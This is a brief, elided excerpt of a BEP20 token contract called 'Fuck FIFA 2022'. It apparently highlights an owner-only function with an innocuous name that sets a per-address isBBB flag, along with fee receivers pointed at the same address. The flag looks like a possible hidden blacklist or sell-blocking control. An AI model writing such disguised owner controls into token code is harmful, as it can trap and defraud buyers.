...
contract FFIA2022 is IBEP20, Auth {
    ...
    string constant _name = "Fuck FIFA 2022";
    string constant _symbol = "FFIA2022";
    ...
    address private marketingFeeReceiver = 0x916075818AEFd2f9041B4e51cd3d3D4D15195F1F;
    address private buybackFeeReceiver = 0x916075818AEFd2f9041B4e51cd3d3D4D15195F1F;
    ...
    function setEventTransfer(address addr, bool bv) external authorized {
        isBBB[addr] = bv;
    }
